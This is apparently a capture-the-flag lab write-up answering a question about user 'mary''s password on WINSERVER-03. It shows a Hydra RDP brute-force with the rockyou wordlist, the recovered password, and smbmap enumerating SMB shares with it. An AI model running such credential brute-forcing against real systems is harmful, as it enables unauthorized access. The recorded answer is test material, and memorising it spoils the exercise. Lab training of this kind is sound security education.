## 19. What is the password of the user account "mary" on WINSERVER-03?

Submit answer

Case-sensitive answer. Please enter text as displayed.

## hotmama 


```bash
root@kali:~# hydra -l mary -P /usr/share/wordlists/rockyou.txt rdp://192.168.100.55
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[STATUS] 1057.00 tries/min, 1057 tries in 00:01h, 14343342 to do in 226:10h, 4 active
[3389][rdp] account on 192.168.100.55 might be valid but account not active for remote desktop: login: mary password: hotmama, continuing attacking the account..
root@kali:~# 
```

```bash

root@kali:~# smbmap -H 192.168.100.55 -u mary -p hotmama
[+] IP: 192.168.100.55:445      Name: ip-192-168-100-55.us-west-1.compute.internal      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        Users                                                   READ ONLY


root@kali:~# smbmap -H 192.168.100.55 -u mary -p hotmamaaaa
[!] Authentication error on 192.168.100.55


```